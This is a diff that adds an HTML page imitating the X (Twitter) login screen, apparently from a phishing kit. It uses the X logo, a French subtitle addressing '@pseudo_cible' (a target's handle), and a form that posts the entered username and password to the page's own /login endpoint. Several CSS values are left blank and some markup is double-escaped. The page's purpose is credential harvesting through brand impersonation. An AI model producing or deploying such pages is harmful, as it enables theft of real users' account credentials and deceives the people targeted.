@@ -1,0 +1,181 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to X</title>
+    <style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: TwitterChirp, -apple-system, BlinkMacSystemFont, &amp;#34;Segoe UI&amp;#34;, Roboto, Helvetica, Arial, sans-serif, -apple-system, BlinkMacSystemFont, &#39;Segoe UI&#39;, Roboto, sans-serif;
+    background: #000000;
+    color: #ffffff;
+    line-height: 1.6;
+}
+
+.container {
+    max-width: 400px;
+    margin: 0 auto;
+    padding: 20px;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+}
+
+.header {
+    text-align: center;
+    margin-bottom: 40px;
+}
+
+.logo img {
+    max-width: 40px;
+    height: auto;
+}
+
+.main {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.form-container {
+    background: #000000;
+    padding: 40px;
+    border-radius: 16px;
+    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+    width: 100%;
+    max-width: ;
+}
+
+h1 {
+    color: #111;
+    font-size: 24px;
+    margin-bottom: 16px;
+    text-align: center;
+}
+
+.subtitle {
+    color: #666;
+    text-align: center;
+    margin-bottom: 32px;
+}
+
+.form-group {
+    margin-bottom: 20px;
+}
+
+label {
+    display: block;
+    margin-bottom: 8px;
+    font-weight: 600;
+    color: #fff;
+}
+
+input {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid #333;
+    border-radius: 4px;
+    font-size: 16px;
+    transition: border-color 0.3s ease;
+}
+
+input:focus {
+    outline: none;
+    border-color: ;
+}
+
+.btn {
+    width: 100%;
+    padding: 12px 24px;
+    border: none;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+}
+
+.btn-primary {
+    background: ;
+    color: white;
+}
+
+.btn-primary:hover {
+    background: ;
+}
+
+.footer {
+    text-align: center;
+    margin-top: 40px;
+    font-size: 14px;
+    color: ;
+}
+
+/* Responsive Design */
+@media (max-width: 768px) {
+    .container {
+        padding: 10px;
+    }
+    
+    .form-container {
+        padding: 20px;
+    }
+    
+    h1 {
+        font-size: 24px;
+    }
+}
+                </style>
+    <script>// Anti-bot protection active</script>
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5a/X_icon_2.svg" alt="X Corp" />
+            </div>
+        </header>
+        
+        <main class="main">
+            <div class="form-container">
+                <h1>
+                    &lt;div style=&#34;display: flex; flex-direction: column; align-items: center; gap: 10px;&#34;&gt;
+                       &lt;img src=&#34;https://abs.twimg.com/sticky/default_profile_images/default_profile_400x400.png&#34; style=&#34;width: 64px; height: 64px; border-radius: 50%; border: 2px solid #333;&#34;&gt;
+                       &lt;span&gt;Connectez-vous à X&lt;/span&gt;
+                    &lt;/div&gt;
+                    </h1>
+                <p class="subtitle">Accédez à votre compte @pseudo_cible</p>
+                
+                <form id="login-form" method="post" action="/login">
+                    <div class="form-group">
+                        <label for="username">Email or Username</label>
+                        <input type="text" id="username" name="username" placeholder="" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" name="password" placeholder="" required>
+                    </div>
+                    
+                    
+                    
+                    <button type="submit" class="btn btn-primary">Log in</button>
+                </form>
+            </div>
+        </main>
+        
+        <footer class="footer">
+            <p>© 2024 Company, Inc.</p>
+        </footer>
+    </div>
+</body>
+</html>
+                
